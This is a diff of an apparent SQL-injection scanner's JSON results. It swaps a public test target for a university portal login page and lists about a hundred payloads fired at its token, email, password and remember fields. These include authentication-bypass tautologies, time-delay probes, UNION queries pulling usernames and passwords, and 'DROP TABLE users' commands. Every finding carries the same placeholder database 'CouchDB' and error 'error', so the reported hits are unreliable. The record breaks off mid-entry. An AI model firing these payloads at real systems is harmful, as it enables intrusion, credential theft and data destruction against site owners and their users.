@@ -1,143 +1,908 @@
 {
-    "target_url": "http://testphp.vulnweb.com/guestbook.php",
+    "target_url": "http://umsportal.uaar.edu.pk/arid/public/login",
     "scan_type": "sqli",
     "depth": 3,
     "results": {
         "sqli": [
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "')",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
-            },
-            {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
-                "method": "POST",
-                "input_field": "searchFor",
-                "payload": "'; WAITFOR DELAY '0:0:5'--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
-            },
-            {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
-                "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' AND 1=(SELECT 1 FROM users WHERE username='admin')--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
-            },
-            {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
-                "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' OR '1'='1' AND 1=(SELECT 1 FROM DUAL)--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
-            },
-            {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
-                "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
-            },
-            {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
-                "method": "POST",
-                "input_field": "searchFor",
+                "input_field": "_token",
                 "payload": "' OR 1=1 WAITFOR DELAY '0:0:5'--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' OR WAITFOR DELAY '0:0:10'--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "\" OR \"text\"=\"text\"",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' OR '1'='1' UNION SELECT * FROM users--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "' OR '1'='1' --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
+                "input_field": "_token",
                 "payload": "'; #",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' OR 1=1#",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "%27%20OR%20%271%27%3D%271",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' AND 1=CAST((SELECT 'test') AS INT)--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "' OR SLEEP(5) AND '1'='1--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' UNION SELECT table_name FROM information_schema.tables--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "' AND 1=CONVERT(INT, (SELECT @@version))--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' UNION SELECT 1, 'admin', 'password'--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "\" OR \"a\"=\"a",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
-                "payload": "' UNION SELECT NULL, NULL, NULL FROM dual--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "input_field": "_token",
+                "payload": "' OR SLEEP(5) AND 'text'='text--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
             },
             {
-                "form_action": "http://testphp.vulnweb.com/search.php?test=query",
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
                 "method": "POST",
-                "input_field": "searchFor",
+                "input_field": "_token",
+                "payload": "' UNION SELECT 1, @@version, NULL--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' OR 1=1--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "'; --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' AND 1=(SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)=8)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
                 "payload": "' UNION SELECT 1--",
-                "db": "MySQL",
-                "error": "you have an error in your sql syntax;",
-                "url": "http://testphp.vulnweb.com/search.php?test=query"
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' UNION SELECT NULL, NULL, NULL FROM dual--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' OR '1'='1'/**/--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' OR SLEEP(10)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' OR SLEEP(5)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' OR pg_sleep(10)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "'/**/OR/**/'1'='1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' UNION SELECT 1, table_name, column_name FROM information_schema.columns--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' AND 1=(SELECT COUNT(*) FROM tablenames)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "' AND 1=(SELECT 1 FROM INFORMATION_SCHEMA.TABLES)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "_token",
+                "payload": "'; DROP TABLE users--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' UNION SELECT table_name FROM information_schema.tables--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR 1=1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' UNION SELECT username, password FROM users--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' AND 1=(SELECT 1 FROM non_existent_table)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR BENCHMARK(10000000,SHA1('test'))--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' AND 1=(SELECT 1 FROM INFORMATION_SCHEMA.TABLES)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' UNION SELECT 1--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR SLEEP(5) AND '1'='1--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR '1'='1' AND 1=(SELECT 1 FROM DUAL)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' AND 1=CAST((SELECT 'test') AS INT)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' UNION SELECT database()--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR WAITFOR DELAY '0:0:10'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "'; SLEEP(5)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR '1'='1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "'; --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' AND 1=(SELECT 1 FROM DUAL)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "'; EXECUTE IMMEDIATE 'DROP TABLE users'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "\" OR 1=1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' UNION SELECT * FROM users--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR '1'='1'/**/--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "')",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR '1'='1'/*",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR '1'='1' AND 1=CAST((SELECT 'test') AS INT)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "email",
+                "payload": "' OR SLEEP(5)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR pg_sleep(10)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' AND 1=(SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)=8)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "'; WAITFOR DELAY '0:0:5'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR SLEEP(10)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' UNION SELECT 1, table_name, column_name FROM information_schema.columns--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR '1'='1' AND 1=CAST((SELECT 'test') AS INT)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "'; SLEEP(5)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR pg_sleep(5)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' UNION SELECT NULL--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' AND 1=(SELECT 1 FROM DUAL)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "admin' --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "admin' #",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR '1'='1' AND 1=(SELECT 1 FROM DUAL)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' UNION SELECT 1, 'admin', 'password'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' AND 1=CAST((SELECT 'test') AS INT)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "')",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' AND 1=CONVERT(INT, (SELECT @@version))--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR '1'='1' UNION SELECT 1,2,3--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "\" OR \"1\"=\"1\"--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "\"; --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' OR 1=1 WAITFOR DELAY '0:0:5'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "'; --",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "%27%20OR%20%271%27%3D%271",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "password",
+                "payload": "' UNION SELECT 1,2,3--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' UNION SELECT NULL--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/check_login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR SLEEP(5) AND 'x'='x--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' AND 1=(SELECT 1 FROM DUAL)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "')",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR 1=1--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "\")) OR (\"1\"=\"1",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' UNION SELECT version()--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' AND 1=CAST((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS INT)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' UNION SELECT username, password FROM users--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR '1'='1'/**/--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR BENCHMARK(10000000,SHA1('test'))--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' OR pg_sleep(10)--",
+                "db": "CouchDB",
+                "error": "error",
+                "url": "http://umsportal.uaar.edu.pk/arid/public/login"
+            },
+            {
+                "form_action": "http://umsportal.uaar.edu.pk/arid/public/check_login",
+                "method": "POST",
+                "input_field": "remember",
+                "payload": "' AND 1=(SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)=8)--",
+                "db": "CouchDB",
+                "error": "error",
